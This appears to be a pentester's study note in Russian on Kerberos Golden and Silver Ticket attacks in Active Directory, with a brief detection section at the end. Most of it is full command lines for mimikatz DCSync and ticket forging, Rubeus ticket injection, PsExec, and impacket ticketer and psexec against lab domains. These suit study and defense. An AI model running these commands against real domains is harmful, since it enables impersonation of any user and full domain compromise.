#windows #AD #kerberos #attacks 

> Необходим для получении сессии любого пользователя

Если у пользователя есть хэш специальной учетки krbtgt, то его хэшем подписываются абсолютно все TGT

- TGT зашифрован секретом krbtgt
- TGS зашифрован секретом учетной записи из-под которой работает аккаунт

![[Golden Ticket.png]]

## Оглавление
- [[#Для атаки необходимо:]]
- [[#Атака]]
- [[#Через Impacket-tickiter]]
- [[#Detect attack]]

---

## Для атаки необходимо:

1)  _FQDN_ домена.
2)  _SID_ домена.
3)  Имя пользователя для имперсонификации.
4)  *Хеш пароля krbtgt

Самый сложный 4 пункт, однако его можно получить, напрмер, через атаку [[DCSync]]

## Атака через Windows

0.0) Проведение DCSync

Через нее получаем все необходимые данные 
```mimikatz
lsadump::dcsync /user:<blabla>\krbtgt
```

1.1) Выпуск Golden Ticket
```powershell
kerberos::golden 
/user:idyachkov # обязательно
/domain:testlab.esc # обязательно
/sid:S-1-5-21-1129291328-2819992169-918366777  # обязательно
/aes256:1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc # или RC4
/rc4:810d754e118439bab1e1d13216150299 # или AES
/ptt # Сразу инжектируем в сессию

/id:1110 # Не обязательно
/groups:513 # Не обязательно
/ticket:idyachkov.testlab.esc # Не обязательно
/endin:600 # общее время жизни (мин)  Не обязательно
/renewmax:10080 # срок, когда билет нужно продлевать (мин) Не обязательно
```

1.2) Выпуск Silver Ticket
```powershell
kerberos::golden 
/user:idyachkov # Обязательно
/domain:testlab.esc # Обязательно
/sid:S-1-5-21-1129291328-2819992169-918366777 # Обязательно
/target:DC01.testlab.esc # От какой машине мы хотим получить доступ к сервису
/service:CIFS # Под какой сервис выпускаем TGS
/aes256:1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc # Или RC4
/rc4:ff955e93a130f5bb1a6565f32b7dc127 # Или AES
/ptt # Инжект сразу в сессию

/ticket:idyachkov_silver.kirbi # без /ptt, если хотим использовать для создания жертвенного процесса

/id:1110 # Не обязательно
/groups:513 # Не обязательно
/endin:600 # общее время жизни (мин) Не обязательно
/renewmax:10080 # срок, когда билет нужно продлевать (мин) # Не обязательно
```

 Популярные службы для Silver Tickets

- **CIFS** - доступ к файловым ресурсам (`\\server\C$`)
- **HOST** - управление службами + WMI + PowerShell
- **HTTP** - веб-приложения, SharePoint
- **LDAP** - запросы к Active Directory
- **MSSQL** - доступ к базам данных
- **RPCSS** - удаленные вызовы процедур
- **WSMAN** - PowerShell Remoting

 
2.0) Получение сессии
```mimikatz
kerberos::ptt <ticket>
```
или WinRM
```powereshell
Enter-PSSession dc01
```


### Создание Жертвенного процесса

1) Выпуск Silver Ticket
```powershell
kerberos::golden 
/user:idyachkov # Обязательно
/domain:testlab.esc # Обязательно
/sid:S-1-5-21-1129291328-2819992169-918366777 # Обязательно
/target:DC01.testlab.esc # От какой машине мы хотим получить доступ к сервису
/service:CIFS # Под какой сервис выпускаем TGS
/aes256:1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc # Или RC4
/rc4:ff955e93a130f5bb1a6565f32b7dc127 # Или AES
/ticket:idyachkov_silver.kirbi # без /ptt, если хотим использовать для создания жертвенного процесса

/id:1110 # Не обязательно
/groups:513 # Не обязательно
/endin:600 # общее время жизни (мин) Не обязательно
/renewmax:10080 # срок, когда билет нужно продлевать (мин) # Не обязательно
```

2) Создание нового процесса
```powershell
Rubeus.exe createnetonly /program:cmd.exe /show
```
Поскольку он не обладает никакими привилегиями и правами, импортируем в его сессию билет

3) Импорт билета
```powershell
Rubeus.exe ptt /ticket:sql01.kirbi
```

4) Использование нового процесса для запуска PSExec.exe 
```powershell
PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
```


## Атака через Linux

1) Определение SID домена
```bash
lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
```


2.2) Выпуск Golden Ticket
```bash
sudo impacket-ticketer \
-nthash <krbtgt_hash>  \
-domain <domain> \ 
-domain-sid <sid>  \
Administrator
```

2.1) Выпуск Silver Ticket
```bash
sudo impacket-ticketer \
-nthash <krbtgt_hash>  \
-domain <domain> \ 
-domain-sid <sid>  \
-spn cifs/sql01.inlanefreight.local \ # Доп поле
Administrator
```

3) Инжектирование билета и получение доступа к хосту
```bash
export KRB5CCNAME=./Administrator.ccache


psexec.py -k -no-pass dc01.inlanefreight.local
# Или
smbclient.py -k -no-pass sql01.inlanefreight.local
```

## Detect attack

Event ID
1) 4768 TGT was granted
2) 4769 TGS was granted

При атаке Golden Ticket мы не запрашиваем TGT у DC, а генерируем его самостоятельно

Необходимо изменять хэш krbtgt 2 раза с интервалом в 10 часов
Для безопасного сброса использовать этот скрипт
[New-KrbtgtKeys.ps1](https://github.com/microsoftarchive/New-KrbtgtKeys.ps1)
